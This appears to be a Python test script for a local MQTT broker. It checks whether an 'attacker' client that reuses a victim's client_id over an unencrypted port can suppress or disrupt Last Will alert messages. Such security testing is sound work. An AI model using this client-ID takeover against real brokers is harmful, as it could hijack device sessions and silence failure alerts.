#!/usr/bin/env python3
"""
MQTT Security Experiment: Last Will and Testament (LWT) Interference Test (MQTT v5, Paho, Callback API v2)

Flow:
1) Monitor (TLS/8883) connects and subscribes to the will topic to detect will messages
2) Victim (TLS/8883) connects with LWT configured, then simulates unexpected disconnect
3) Monitor should receive the victim's will message published by the broker
4) Attacker (non-TLS/1883) connects using SAME client_id as victim
5) Victim (TLS/8883) reconnects with LWT, then disconnects unexpectedly again
6) Analyze whether attacker's presence interferes with will message delivery

Notes:
- Requires Mosquitto configured with TLS on 8883 and a non-TLS listener on 1883
"""

import json
import logging
import ssl
import time
import threading
import socket
from datetime import datetime

import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes

# -----------------------
# Logging
# -----------------------
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("mqtt-lwt-experiment")

# -----------------------
# Broker / Test Config
# -----------------------
BROKER_HOST = "localhost"
TLS_PORT = 8883
NON_TLS_PORT = 1883

VICTIM_CLIENT_ID = "test_victim_lwt"        # victim's client_id; attacker reuses this
MONITOR_CLIENT_ID = "monitor_lwt"           # dedicated will message monitor
WILL_TOPIC = "lwt/alerts"                   # topic for will messages
QOS = 1                                     # QoS1 for reliable delivery
SESSION_EXPIRY = 3600                       # seconds

# Will message content
WILL_MESSAGE = "ALERT: Client disconnected unexpectedly!"
WILL_QOS = 1
WILL_RETAIN = True

# TLS certificate paths (adjust paths)
CA_CERT = "ca.crt"
CLIENT_CERT = "client.crt"
CLIENT_KEY = "client.key"

# Timeouts
CONNECT_TIMEOUT = 8
DISCONNECT_WAIT = 5
MONITOR_WAIT = 10

# -----------------------
# Experiment Class
# -----------------------
class MQTTLWTExperiment:
    def __init__(self):
        self.will_messages_received = []
        self.all_messages_received = []
        self.monitor_connected = threading.Event()
        self.victim_connected = threading.Event()
        self.attacker_connected = threading.Event()
        self.will_message_lock = threading.Lock()

    # ---------- v5 Callbacks (Callback API v2 signatures) ----------
    def on_connect(self, client, userdata, flags, reason_code, properties=None):
        ctype = userdata.get("client_type", "unknown")
        logger.info(f"[{ctype}] on_connect: reason_code={reason_code}")
        if reason_code == 0:
            if ctype == "monitor":
                self.monitor_connected.set()
            elif ctype == "victim":
                self.victim_connected.set()
            elif ctype == "attacker":
                self.attacker_connected.set()

    def on_disconnect(self, client, userdata, flags, reason_code, properties=None):
        """Callback for when the client disconnects from the server."""
        client_type = userdata.get('client_type', 'unknown')
        logger.info(f"[{client_type}] Disconnected with reason code {reason_code}")
        if client_type == "monitor":
            self.monitor_connected.clear()
        elif client_type == "victim":
            self.victim_connected.clear()
        elif client_type == "attacker":
            self.attacker_connected.clear()

    def on_message(self, client, userdata, msg):
        """Callback for when a PUBLISH message is received from the server."""
        client_type = userdata.get('client_type', 'unknown')
        message = {
            'timestamp': datetime.now().isoformat(),
            'client_type': client_type,
            'topic': msg.topic,
            'payload': msg.payload.decode(),
            'qos': msg.qos,
            'retain': msg.retain
        }

        with self.will_message_lock:
            self.all_messages_received.append(message)

            # Check if this is a will message
            if msg.topic == WILL_TOPIC:
                self.will_messages_received.append(message)
                logger.critical(f"[{client_type}] WILL MESSAGE DETECTED: {msg.topic} - {msg.payload.decode()}")
            else:
                logger.info(f"[{client_type}] Regular message: {msg.topic} - {msg.payload.decode()}")

    def on_subscribe(self, client, userdata, mid, reason_code_list, properties=None):
        """Callback for when subscription is confirmed."""
        client_type = userdata.get('client_type', 'unknown')
        logger.info(f"[{client_type}] Subscription confirmed (mid: {mid})")

    # ---------- Client Builders ----------
    def _base_client(self, client_id: str, client_type: str, use_tls: bool, will_config=None):
        c = mqtt.Client(
            client_id=client_id,
            protocol=mqtt.MQTTv5,
            callback_api_version=CallbackAPIVersion.VERSION2,
        )
        c.user_data_set({"client_type": client_type})
        c.on_connect = self.on_connect
        c.on_disconnect = self.on_disconnect
        c.on_message = self.on_message
        c.on_subscribe = self.on_subscribe

        # Configure Last Will and Testament if provided
        if will_config:
            will_props = Properties(PacketTypes.WILLMESSAGE)
            if 'message_expiry' in will_config:
                will_props.MessageExpiryInterval = will_config['message_expiry']

            c.will_set(
                topic=will_config['topic'],
                payload=will_config['payload'],
                qos=will_config['qos'],
                retain=will_config['retain'],
                properties=will_props
            )
            logger.info(f"[{client_type}] Will message configured: topic={will_config['topic']}")

        if use_tls:
            c.tls_set(
                ca_certs=CA_CERT,
                certfile=CLIENT_CERT,
                keyfile=CLIENT_KEY,
                tls_version=ssl.PROTOCOL_TLS_CLIENT,
            )
        return c

    def monitor_client(self):
        """Monitor client subscribes to will topic to detect will messages."""
        return self._base_client(MONITOR_CLIENT_ID, "monitor", use_tls=True)

    def victim_client(self, with_will=True):
        """Victim client with Last Will and Testament configured."""
        will_config = None
        if with_will:
            will_config = {
                'topic': WILL_TOPIC,
                'payload': f"{WILL_MESSAGE} (from {VICTIM_CLIENT_ID})",
                'qos': WILL_QOS,
                'retain': WILL_RETAIN,
                'message_expiry': 300
            }
        return self._base_client(VICTIM_CLIENT_ID, "victim", use_tls=True, will_config=will_config)

    def attacker_client(self):
        """Attacker reuses victim's client_id but connects over non-TLS."""
        return self._base_client(VICTIM_CLIENT_ID, "attacker", use_tls=False)

    # ---------- Connect helpers (v5 clean-start + properties) ----------
    @staticmethod
    def connect_v5(client: mqtt.Client, host: str, port: int, *, clean_start, session_expiry: int):
        props = Properties(PacketTypes.CONNECT)
        props.SessionExpiryInterval = session_expiry
        client.connect(host, port, clean_start=clean_start, properties=props)
        client.loop_start()

    @staticmethod
    def force_disconnect(client: mqtt.Client):
        """Simulate unexpected disconnect by closing socket forcefully."""
        try:
            if hasattr(client, '_sock') and client._sock:
                client._sock.close()
            client.loop_stop()
            logger.info("Client forcefully disconnected (socket closed)")
        except Exception as e:
            logger.warning(f"Error during force disconnect: {e}")

    # -----------------------
    # Experiment Phases
    # -----------------------
    def phase_1_setup_monitor(self):
        """
        Monitor client connects and subscribes to will topic to catch will messages.
        """
        logger.info("\n--- Phase 1: Monitor connects (TLS) and subscribes to will topic ---")
        self.monitor = self.monitor_client()
        self.connect_v5(self.monitor, BROKER_HOST, TLS_PORT,
                        clean_start=1,
                        session_expiry=0)

        if not self.monitor_connected.wait(CONNECT_TIMEOUT):
            raise RuntimeError("Monitor failed to connect in time")

        # Subscribe to will topic
        sub_result = self.monitor.subscribe(WILL_TOPIC, qos=QOS)
        logger.info(f"[monitor] Subscribed to {WILL_TOPIC} (mid={sub_result[1]})")
        time.sleep(1)  # Let subscription settle

    def phase_2_victim_baseline_will_test(self):
        """
        Baseline test: Victim connects with will message, then disconnects unexpectedly.
        Monitor should receive the will message.
        """
        logger.info("\n--- Phase 2: Baseline will message test (victim only) ---")
        initial_will_count = len(self.will_messages_received)

        victim = self.victim_client(with_will=True)
        self.connect_v5(victim, BROKER_HOST, TLS_PORT,
                        clean_start=1,
                        session_expiry=SESSION_EXPIRY)

        if not self.victim_connected.wait(CONNECT_TIMEOUT):
            victim.loop_stop()
            raise RuntimeError("Victim failed to connect in time")

        logger.info("[victim] Connected with will message, simulating unexpected disconnect...")

        # Simulate unexpected disconnect (not clean disconnect)
        self.force_disconnect(victim)

        # Wait for will message to be published by broker
        time.sleep(DISCONNECT_WAIT)

        baseline_will_count = len(self.will_messages_received) - initial_will_count
        logger.info(f"Baseline test: {baseline_will_count} will messages received")

    def phase_3_attacker_connects(self):
        """
        Attacker connects using same client_id via non-TLS port.
        This may interfere with subsequent will message delivery.
        """
        logger.info("\n--- Phase 3: Attacker connects using victim's client_id (non-TLS) ---")
        self.attacker = self.attacker_client()
        self.connect_v5(self.attacker, BROKER_HOST, NON_TLS_PORT,
                        clean_start=0,
                        session_expiry=SESSION_EXPIRY)

        if not self.attacker_connected.wait(CONNECT_TIMEOUT):
            self.attacker.loop_stop()
            raise RuntimeError("Attacker failed to connect in time")

        logger.info("[attacker] Connected successfully, keeping connection active")
        time.sleep(2)  # Let attacker connection stabilize

    def phase_4_victim_will_test_with_attacker(self):
        """
        With attacker connected, victim reconnects with will message and disconnects unexpectedly.
        Test whether will message is still delivered or if attacker interferes.
        """
        logger.info("\n--- Phase 4: Will message test with attacker present ---")
        pre_test_will_count = len(self.will_messages_received)

        victim = self.victim_client(with_will=True)
        self.connect_v5(victim, BROKER_HOST, TLS_PORT,
                        clean_start=1,
                        session_expiry=SESSION_EXPIRY)

        # Note: victim connection might kick off attacker or vice versa depending on broker behavior
        time.sleep(2)

        logger.info("[victim] Reconnected with will message, simulating unexpected disconnect...")

        # Simulate unexpected disconnect
        self.force_disconnect(victim)

        # Wait for will message
        time.sleep(DISCONNECT_WAIT)

        interference_will_count = len(self.will_messages_received) - pre_test_will_count
        logger.info(f"Interference test: {interference_will_count} will messages received")

    def phase_5_cleanup_and_final_monitor(self):
        """
        Clean up connections and do final monitoring for any delayed will messages.
        """
        logger.info("\n--- Phase 5: Cleanup and final monitoring ---")

        # Disconnect attacker cleanly
        if hasattr(self, 'attacker'):
            self.attacker.disconnect()
            self.attacker.loop_stop()
            logger.info("[attacker] Disconnected cleanly")

        # Wait a bit more for any delayed will messages
        time.sleep(MONITOR_WAIT)

        # Keep monitor running until the end
        if hasattr(self, 'monitor'):
            self.monitor.disconnect()
            self.monitor.loop_stop()
            logger.info("[monitor] Disconnected")

    # -----------------------
    # Orchestration + Analysis
    # -----------------------
    def run(self):
        logger.info("=== MQTT v5 Last Will and Testament Security Experiment ===")
        try:
            self.phase_1_setup_monitor()
            self.phase_2_victim_baseline_will_test()
            self.phase_3_attacker_connects()
            self.phase_4_victim_will_test_with_attacker()
            self.phase_5_cleanup_and_final_monitor()
            self.analyze_results()
            return True
        except Exception as e:
            logger.exception(f"Experiment failed: {e}")
            return False
        finally:
            logger.info("=== Experiment Complete ===")

    def analyze_results(self):
        """Analyze will message delivery and potential interference."""
        logger.info("\n--- Results Analysis ---")
        logger.info(f"Total will messages received: {len(self.will_messages_received)}")
        logger.info(f"Total messages received: {len(self.all_messages_received)}")

        if self.will_messages_received:
            logger.info("\nWill messages detected:")
            for i, msg in enumerate(self.will_messages_received, 1):
                logger.info(f"  {i}. [{msg['client_type']}] {msg['timestamp']}: {msg['payload']}")
                if msg['retain']:
                    logger.info(f"     (RETAIN flag set)")
        else:
            logger.warning("No will messages received - potential interference or configuration issue!")

        # Analysis
        if len(self.will_messages_received) >= 2:
            logger.info("\nWill messages delivered in both baseline and interference scenarios")
        elif len(self.will_messages_received) == 1:
            logger.warning("\nOnly one will message received - possible interference detected")
        else:
            logger.critical("\nNo will messages received - serious interference or configuration issue")

        # Check for anomalies
        monitor_msgs = [m for m in self.all_messages_received if m["client_type"] == "monitor"]
        attacker_msgs = [m for m in self.all_messages_received if m["client_type"] == "attacker"]

        if attacker_msgs:
            logger.warning(f"\nAttacker received {len(attacker_msgs)} messages")
            for msg in attacker_msgs:
                logger.warning(f"    [attacker] {msg['payload']}")

        logger.info(f"\nMonitor client received {len(monitor_msgs)} total messages")

# -----------------------
# Main
# -----------------------
def main():
    print("MQTT Last Will and Testament Security Experiment (MQTT v5, Callback API v2)")
    print("Ensure your broker is running with TLS on 8883 and a non-TLS listener on 1883.")
    print("This test will check if will messages are properly delivered when an attacker")
    print("connects with the same client ID via the insecure port.")
    input("Press Enter to start... ")

    exp = MQTTLWTExperiment()
    success = exp.run()

    # Save results
    results = {
        "success": success,
        "will_messages": exp.will_messages_received,
        "all_messages": exp.all_messages_received,
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "total_will_messages": len(exp.will_messages_received),
            "total_messages": len(exp.all_messages_received),
            "potential_interference": len(exp.will_messages_received) < 2
        }
    }

    with open("mqtt_lwt_experiment_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)

    logger.info("Results saved -> mqtt_lwt_experiment_results.json")

    if success:
        print(f"\nExperiment completed successfully")
        print(f"Will messages received: {len(exp.will_messages_received)}")
        if len(exp.will_messages_received) < 2:
            print("Potential interference detected - check results for details")
    else:
        print("Experiment failed - check logs for details")

if __name__ == "__main__":
    main()
